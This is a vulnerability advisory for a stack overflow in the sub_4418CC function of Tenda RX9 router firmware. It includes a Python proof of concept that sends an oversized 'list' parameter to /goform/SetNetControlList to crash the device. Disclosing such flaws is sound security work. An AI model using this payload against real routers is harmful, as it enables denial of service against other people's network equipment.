# Tenda router sub_4418CC function stack overflow vulnerability

> vendor:Tenda
>
> product:RX9
>
> version:v1.0 v22.03.02.54
>
> type:Stack Overflow

## Vulnerability Description

Tenda RX9 v1.0 v22.03.02.54 were discovered to contain a stack overflow via the list parameter in the sub_4418CC function.

## Vulnerability Details

In the function, after V1 obtains the variable named "list", it is directly called by the sub_4418CC function without processing. In this function, without processing, it is called by the dangerous function strcpy. The attacker can modify the variable list in the post request. The parameter length may overflow the v14-based stack buffer to achieve denial of service.

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/22f5d026-0984-4ef1-82bf-e375f68715c2)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/2df55055-9b82-4a01-9006-ce273d001dcd)
![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/b2dddc4b-5644-4c16-a250-d28876aed3de)

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/97596476-96d6-45de-9d2a-c119469660cf)


## POC

    import socket
    import os
    from pwn import *

    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

    ip = '192.168.244.130'
    port = 80

    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    li('[+] connecting')
    r.connect((ip, port))
    li('[+] connect finish')

    rn = b'\r\n'

    p1 = b'A' * 0x500

    p2 = b'list=' + p1

    p3 = b"POST /goform/SetNetControlList" + b" HTTP/1.1" + rn
    p3 += b"Host: 192.168.244.130" + rn
    p3 += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" + rn
    p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
    p3 += b"Accept-Language: gzip, deflate" + rn
    p3 += b"Accept-Encoding: zh-CN,zh;q=0.9" + rn
    p3 += b"Cookie: password=cjq1qw" + rn
    p3 += b"Connection: close" + rn
    p3 += b"Upgrade-Insecure-Requests: 1" + rn
    p3 += (b"Content-Length: %d" % len(p2)) +rn
    p3 += b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'+rn
    p3 += rn
    p3 += p2

    li('[+] sending payload')
    r.send(p3)

    response = r.recv(4096)
    response = response.decode()
    li(response)


   
